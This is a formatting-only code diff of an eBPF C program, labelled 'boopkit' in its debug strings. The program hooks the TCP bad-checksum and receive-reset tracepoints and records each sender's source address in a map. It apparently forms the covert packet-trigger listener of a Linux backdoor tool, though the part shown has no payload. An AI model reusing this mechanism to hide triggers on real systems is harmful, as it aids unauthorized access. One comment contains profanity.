@@ -27,17 +27,14 @@
 #include "proto.h"
 // clang-format on
 
-struct
-{
-  __uint (type, BPF_MAP_TYPE_HASH);
-  __uint (max_entries, 128);
-  __type (key, int);
-  __type (value, struct tcp_return);
-} events SEC (".maps");
+struct {
+  __uint(type, BPF_MAP_TYPE_HASH);
+  __uint(max_entries, 128);
+  __type(key, int);
+  __type(value, struct tcp_return);
+} events SEC(".maps");
 
-struct tcp_bad_csum_args_t
-{
-
+struct tcp_bad_csum_args_t {
   // Here be dragons
   //
   // The padding here is to offset the embedded IPv4 address
@@ -68,20 +65,17 @@ struct tcp_bad_csum_args_t
 // size:28;   signed:0;
 //
 // print fmt: "src=%pISpc dest=%pISpc", REC->saddr, REC->daddr
-SEC ("tracepoint/tcp/tcp_bad_csum")
-int
-tcp_bad_csum (struct tcp_bad_csum_args_t *args)
-{
-  bpf_printk ("boopkit: tcp_bad_csum");
+SEC("tracepoint/tcp/tcp_bad_csum")
+int tcp_bad_csum(struct tcp_bad_csum_args_t *args) {
+  bpf_printk("boopkit: tcp_bad_csum");
   int saddrkey = 1;
   struct tcp_return ret;
-  memcpy (ret.saddr, args->saddr, sizeof (args->saddr));
-  bpf_map_update_elem (&events, &saddrkey, &ret, 1);
+  memcpy(ret.saddr, args->saddr, sizeof(args->saddr));
+  bpf_map_update_elem(&events, &saddrkey, &ret, 1);
   return 0;
 }
 
-struct tcp_receive_reset_args_t
-{
+struct tcp_receive_reset_args_t {
   __u64 pad1;
   __u64 pad2;
   __u16 sport;
@@ -115,20 +109,18 @@ struct tcp_receive_reset_args_t
 // saddrv6=%pI6c daddrv6=%pI6c sock_cookie=%llx", __print_symbolic(REC->family,
 // { 2, "AF_INET" }, { 10, "AF_INET6" }), REC->sport, REC->dport, REC->saddr,
 // REC->daddr, REC->saddr_v6, REC->daddr_v6, REC->sock_cookie
-SEC ("tracepoint/tcp/tcp_receive_reset")
-int
-tcp_receive_reset (struct tcp_receive_reset_args_t *args)
-{
-  bpf_printk ("boopkit: tcp_receive_reset");
+SEC("tracepoint/tcp/tcp_receive_reset")
+int tcp_receive_reset(struct tcp_receive_reset_args_t *args) {
+  bpf_printk("boopkit: tcp_receive_reset");
   // bpf_printk("boopkit: tcp_receive_reset saddr=%pI4", args->saddr);
   int saddrkey = 1;
   struct tcp_return ret;
-  memcpy (ret.saddr, args->saddr, sizeof (args->saddr));
-  bpf_map_update_elem (&events, &saddrkey, &ret, 1);
+  memcpy(ret.saddr, args->saddr, sizeof(args->saddr));
+  bpf_map_update_elem(&events, &saddrkey, &ret, 1);
   return 0;
 }
 
 // SPDX-License-Identifier: GPL-2.0
 // The eBPF probe is dual-licensed with GPL because Linux is a fucking shit
 // show.
-char LICENSE[] SEC ("license") = "GPL";
+char LICENSE[] SEC("license") = "GPL";
